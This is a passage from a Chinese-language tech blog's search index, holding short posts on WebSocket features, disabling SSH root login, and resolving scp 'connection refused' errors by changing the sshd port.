<h3 id="WebSocket優點-amp-特色"><a href="#WebSocket優點-amp-特色" class="headerlink" title="WebSocket優點&amp;特色"></a>WebSocket優點&amp;特色</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">WebSocket最大優點是，server可以主動向client推送資料，client也可以主動向server發送資料，是真正的雙向溝通。</span><br><span class="line">其他特色包含以下:</span><br><span class="line">1.建立在TCP Protocol之上，在Server上實作較容易。</span><br><span class="line">2.與HTTP Protocol有著良好的相容性。預設port是80和443，且Handshake採用HTTP Protocol，因此Handshake時，能通過各種HTTP proxy server。</span><br><span class="line">3.資料輕量化，耗效能小。</span><br><span class="line">4.可以推送text data，也可以推送binary data。</span><br><span class="line">5.没有Same Origin Policy，client可以與任何server溝通。</span><br><span class="line">6.Protocol開頭符號是ws，(如果加密，則為wss)。</span><br><span class="line"></span><br><span class="line">example:ws://example.com/some/path</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>WebSocket</category>
      </categories>
      <tags>
        <tag>WebSocket</tag>
      </tags>
  </entry>
  <entry>
    <title>關閉SSHRoot遠端登入</title>
    <url>/posts/31abb866/</url>
    <content><![CDATA[<h3 id="關閉-SSH-root-遠端登入"><a href="#關閉-SSH-root-遠端登入" class="headerlink" title="關閉 SSH root 遠端登入"></a>關閉 SSH root 遠端登入</h3><span id="more"></span>
<p>以root權限編輯SSH設定檔</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ vim /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure>

<p>將該設定改成no</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 是否允許 root 管理者以 SSH 登入</span></span><br><span class="line">PermitRootLogin no</span><br></pre></td></tr></table></figure>

<p>重新啟動SSH服務</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 重新啟動 SSH 服務（CentOS Linux）</span></span><br><span class="line">systemctl restart sshd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新啟動 SSH 服務（Ubuntu Linux）</span></span><br><span class="line">service sshd restart</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>CentOS7</category>
      </categories>
      <tags>
        <tag>CentOS7</tag>
      </tags>
  </entry>
  <entry>
    <title>關於ssh: connect to host IP port 22: Connection refused</title>
    <url>/posts/801ea98e/</url>
    <content><![CDATA[<h3 id="關於ssh-connect-to-host-IP-port-22-Connection-refused"><a href="#關於ssh-connect-to-host-IP-port-22-Connection-refused" class="headerlink" title="關於ssh: connect to host IP port 22: Connection refused"></a>關於ssh: connect to host IP port 22: Connection refused</h3><span id="more"></span>
<p>在Linux機器上通常做兩台Server之間的檔案傳輸會使用scp來傳輸資料。<br>若下scp -r &#x2F;root&#x2F;data username@host:&#x2F;root&#x2F;data 指令後，出現<br>ssh: connect to host IP port 22: Connection refused 有以下解法。</p>
<h3 id="安裝openssh"><a href="#安裝openssh" class="headerlink" title="安裝openssh"></a>安裝openssh</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo yum install openssh-client</span><br><span class="line">sudo yum install openssh-server</span><br></pre></td></tr></table></figure>

<h3 id="使用特定Port傳輸"><a href="#使用特定Port傳輸" class="headerlink" title="使用特定Port傳輸"></a>使用特定Port傳輸</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Your ISP may block connections to port 22 (nothing you or your router can <span class="keyword">do</span> about it). Just <span class="built_in">set</span> SSHd to run on a different port, e.g. 2222.</span><br><span class="line"></span><br><span class="line">In /etc/ssh/sshd_config, change Port 22 to Port 2222 and <span class="keyword">then</span> sudo service ssh restart. Port forward 2222 (or whatever), and try again.</span><br></pre></td></tr></table></figure>

<h3 id="使用特定Port-Example"><a href="#使用特定Port-Example" class="headerlink" title="使用特定Port Example"></a>使用特定Port Example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">scp -r -P 2222 /root/data username@host:/root/data</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>ssh</category>
      </categories>
      <tags>
        <tag>scp</tag>
      </tags>
  </entry>
</search>
